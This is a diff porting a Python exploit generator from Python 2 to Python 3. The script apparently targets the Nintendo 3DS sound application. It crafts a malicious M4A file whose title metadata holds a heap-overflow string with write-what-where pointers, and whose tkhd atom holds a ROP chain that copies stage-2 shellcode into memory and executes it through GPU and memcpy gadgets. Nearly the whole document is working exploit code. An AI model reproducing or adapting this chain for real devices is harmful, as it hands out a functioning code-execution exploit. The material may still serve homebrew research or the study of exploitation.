@@ -1,10 +1,12 @@
-#!/usr/bin/python2.7
+#!/usr/bin/env python
 
+from __future__ import division, print_function, unicode_literals
 import sys
 from struct import pack
 from subprocess import call
 from constants import STAGE2_SIZE, constants
 from os import environ, path, name as osname
+from binascii import hexlify, unhexlify
 
 REGION = "usa"
 TYPE = "old" # "new"
@@ -58,13 +60,13 @@ where = malloc_free_list_head
 r1 = what
 r2 = where - 12
 
-UNICODE_MARKER = '\xff\xfe' # unicode marker
+UNICODE_MARKER = b'\xff\xfe' # unicode marker
 
-exp = "<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x00"
-exp += " \x00"*((772-len(exp)) / 2)
+exp = b"<\x003\x00 \x00n\x00e\x00d\x00w\x00i\x00l\x00l\x00 \x002\x000\x001\x006\x00"
+exp += b" \x00"*((772-len(exp)) // 2)
 assert len(exp) == 772
 
-exp += "aaaa" # base
+exp += b"aaaa" # base
 exp += p(magic_end) # r3
 exp += p(r2) # r2
 exp += p(r1) # r1
@@ -88,42 +90,42 @@ def code_va_to_pa(va):
 
 payload = get_shellcode()
 
-rop  = "AAAA" # r4
-rop += "BBBB" # r5
-rop += "CCCC" # r6
-rop += "DDDD" # r7
-rop += "EEEE" # r8
-rop += "FFFF" # r9
-rop += "GGGG" # r10
+rop  = b"AAAA" # r4
+rop += b"BBBB" # r5
+rop += b"CCCC" # r6
+rop += b"DDDD" # r7
+rop += b"EEEE" # r8
+rop += b"FFFF" # r9
+rop += b"GGGG" # r10
 rop += p(pop_r0_pc) # pc
 rop += p(payload_heap_addr) # dst
 rop += p(pop_r1_pc)
 rop += p(payload_stack_addr) # src
 rop += p(pop_r2_thru_r6_pc) #pc
 rop += p(STAGE2_SIZE) #length
-rop += "bbbb" # r3
-rop += "cccc" # r4
-rop += "dddd" # r5
-rop += "eeee" # r6
+rop += b"bbbb" # r3
+rop += b"cccc" # r4
+rop += b"dddd" # r5
+rop += b"eeee" # r6
 rop += p(memcpy_gadget) # pc
-rop += "aaaa" # r4
-rop += "bbbb" # r5
-rop += "cccc" # r6
-rop += "dddd" # r7
-rop += "eeee" # r8
-rop += "ffff" # r9
-rop += "gggg" # r10
+rop += b"aaaa" # r4
+rop += b"bbbb" # r5
+rop += b"cccc" # r6
+rop += b"dddd" # r7
+rop += b"eeee" # r8
+rop += b"ffff" # r9
+rop += b"gggg" # r10
 rop += p(pop_r0_pc)
 rop += p(payload_heap_addr) # r0
 rop += p(pop_r1_pc)
 rop += p(0x1000)
 rop += p(gpu_flushcache_gadget)
-rop += "bbbb" # r4
-rop += "cccc" # r5
-rop += "dddd" # r6
+rop += b"bbbb" # r4
+rop += b"cccc" # r5
+rop += b"dddd" # r6
 rop += p(gpu_enqueue_gadget)
 if REGION != 'kor':
-    rop += "aaaa" # skipped
+    rop += b"aaaa" # skipped
 rop += p(4)
 rop += p(payload_heap_addr)
 rop += p(pa_to_gpu(code_va_to_pa(stage2_code_va)))
@@ -133,79 +135,79 @@ rop += p(0)
 rop += p(8)
 rop += p(0)
 if REGION == 'kor':
-    rop += "aaaa" # skipped (with KOR the above gxcmd buffer is at sp+0 instead of sp+4, but stackframe size is the same)
-rop += "AAAA" # r4
-rop += "AAAA" # r5
-rop += "AAAA" # r6
-rop += "AAAA" # r7
-rop += "AAAA" # r8
-rop += "AAAA" # r9
+    rop += b"aaaa" # skipped (with KOR the above gxcmd buffer is at sp+0 instead of sp+4, but stackframe size is the same)
+rop += b"AAAA" # r4
+rop += b"AAAA" # r5
+rop += b"AAAA" # r6
+rop += b"AAAA" # r7
+rop += b"AAAA" # r8
+rop += b"AAAA" # r9
 if REGION != 'kor':
-    rop += "AAAA" # r10
-    rop += "AAAA" # r11
+    rop += b"AAAA" # r10
+    rop += b"AAAA" # r11
 rop += p(pop_r0_pc) # pc
 rop += p(0x10000000) # r0
 rop += p(pop_r1_pc) # pc
 rop += p(0) # r1
 rop += p(sleep_gadget) # pc # {R4-R6,LR}
-rop += "aaaa" # r4
-rop += "bbbb" # r5
-rop += "cccc" # r6
+rop += b"aaaa" # r4
+rop += b"bbbb" # r5
+rop += b"cccc" # r6
 rop += p(stage2_code_va)
 rop += payload
 
-tkhd_data = 'A'*136 # padding
+tkhd_data = b'A'*136 # padding
 if REGION != 'kor':
-    tkhd_data += 'A'*0x28 # padding
+    tkhd_data += b'A'*0x28 # padding
 tkhd_data += rop # ROP starts here
-tkhd_data += '00000002000000000000940000000000000000000000000001000000000100000000000000'.decode("hex")
-tkhd_data += '0000000000000000010000000000000000000000000000400000000000000000000000'.decode("hex")
+tkhd_data += unhexlify(b'00000002000000000000940000000000000000000000000001000000000100000000000000')
+tkhd_data += unhexlify(b'0000000000000000010000000000000000000000000000400000000000000000000000')
 
 assert len(tkhd_data) < 0x800 # so we don't allocate off the tail.
 
-l = [('ftyp', '4d344120000000004d3441206d70343269736f6d00000000'),
-    ('mdat', '00'),
-    ('moov',
+l = [(b'ftyp', b'4d344120000000004d3441206d70343269736f6d00000000'),
+    (b'mdat', b'00'),
+    (b'moov',
         [
-        ('mvhd', '00'),
-        ('trak',
+        (b'mvhd', b'00'),
+        (b'trak',
             [
-            ('tkhd', tkhd_data.encode("hex")),
-            ('mdia',
+            (b'tkhd', hexlify(tkhd_data)),
+            (b'mdia',
                 [
-                ('mdhd', '00000000aac54f45aac54f4500003e800000940000000000'),
-                ('hdlr', '0000000000000000736f756e00000000000000000000000000'),
-                ('minf',
+                (b'mdhd', b'00000000aac54f45aac54f4500003e800000940000000000'),
+                (b'hdlr', b'0000000000000000736f756e00000000000000000000000000'),
+                (b'minf',
                     [
-                    ('smhd', '0000000000000000'),
-                    ('dinf',
+                    (b'smhd', b'0000000000000000'),
+                    (b'dinf',
                         [
-                        ('dref', [('url ', '00000001')])
+                        (b'dref', [(b'url ', b'00000001')])
                         ]),
-                    ('stbl',
+                    (b'stbl',
                         [
-                        ('stsd', [('mp4a', [('esds', '000000000380808022000200048080801440150018000000fa000000fa0005808080021408068080800102')])]),
-                        ('stsz', '00'),
-                        ('stts', '00000000000000010000002500000400'),
-                        ('stco', '000000000000000100000028'),
-                        ('stsc', '0000000000000001000000010000002500000001')
+                        (b'stsd', [(b'mp4a', [(b'esds', b'000000000380808022000200048080801440150018000000fa000000fa0005808080021408068080800102')])]),
+                        (b'stsz', b'00'),
+                        (b'stts', b'00000000000000010000002500000400'),
+                        (b'stco', b'000000000000000100000028'),
+                        (b'stsc', b'0000000000000001000000010000002500000001')
                         ])
                     ])
                 ])
             ]),
-        ('udta',
-            [('meta', [
-                ('hdlr', '00000000000000006d6469726170706c000000000000000000'),
-                ('ilst',
-                    [('\xa9nam', [('data', '0000000100000000' + (UNICODE_MARKER + exp).encode("hex"))]),
-                     ('\xa9ART', [('data', '00000001000000004e6564')]),
-                     ('\xa9alb', [('data', '00000001000000004e696e74656e646f2033445320536f756e64')]),
-                     ('\xa9day', [('data', '000000010000000032303030')]),
-                     ('edoc', [('data', '00000001000000003344533100')]),
-                     ('wtfs', [('data', '0000000100000000303032303500')]),
-                     ('dicr', [('data', '0000000100000000343935414236383100')]),
-                     ('dide', [('data', '0000000100000000343935414236383100')]),
-                     ('tmrp', [('data', '000000010000000075706c6f61642c65646974446973747269627574652c6669727374446973747269627574652c7365636f6e644469737472696275746500')])
+        (b'udta',
+            [(b'meta', [
+                (b'hdlr', b'00000000000000006d6469726170706c000000000000000000'),
+                (b'ilst',
+                    [(b'\xa9nam', [(b'data', b'0000000100000000' + hexlify(UNICODE_MARKER + exp))]),
+                     (b'\xa9ART', [(b'data', b'00000001000000004e6564')]),
+                     (b'\xa9alb', [(b'data', b'00000001000000004e696e74656e646f2033445320536f756e64')]),
+                     (b'\xa9day', [(b'data', b'000000010000000032303030')]),
+                     (b'edoc', [(b'data', b'00000001000000003344533100')]),
+                     (b'wtfs', [(b'data', b'0000000100000000303032303500')]),
+                     (b'dicr', [(b'data', b'0000000100000000343935414236383100')]),
+                     (b'dide', [(b'data', b'0000000100000000343935414236383100')]),
+                     (b'tmrp', [(b'data', b'000000010000000075706c6f61642c65646974446973747269627574652c6669727374446973747269627574652c7365636f6e644469737472696275746500')])
                      ])
                 ])
             ])
@@ -213,26 +215,26 @@ l = [('ftyp', '4d344120000000004d3441206d70343269736f6d00000000'),
     ]
 
 prefixes = {
-    'meta': '\x00\x00\x00\x00',
-    'stsd': '\x00\x00\x00\x00\x00\x00\x00\x01',
-    'dref': '\x00\x00\x00\x00\x00\x00\x00\x01',
-    'mp4a': '\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x10\x00\x00\x00\x00\x3E\x80\x00\x00'
+    b'meta': b'\x00\x00\x00\x00',
+    b'stsd': b'\x00\x00\x00\x00\x00\x00\x00\x01',
+    b'dref': b'\x00\x00\x00\x00\x00\x00\x00\x01',
+    b'mp4a': b'\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x10\x00\x00\x00\x00\x3E\x80\x00\x00'
 }
 
 def to_string(tree):
     def internal(tree):
         sz = 0
-        ret = ""
+        ret = b""
         for name, data in tree:
-            if type(data) is str:
-                rdata = data.decode("hex")
+            if type(data) is str or type(data) is bytes:
+                rdata = unhexlify(data)
                 chunk_size = len(rdata)
             else:
                 chunk_size, rdata = internal(data)
                 chunk_size
             chunk_size += 8
 
-            prefix = prefixes.get(name, '')
+            prefix = prefixes.get(name, b'')
             rdata = prefix + rdata
             chunk_size += len(prefix)
 
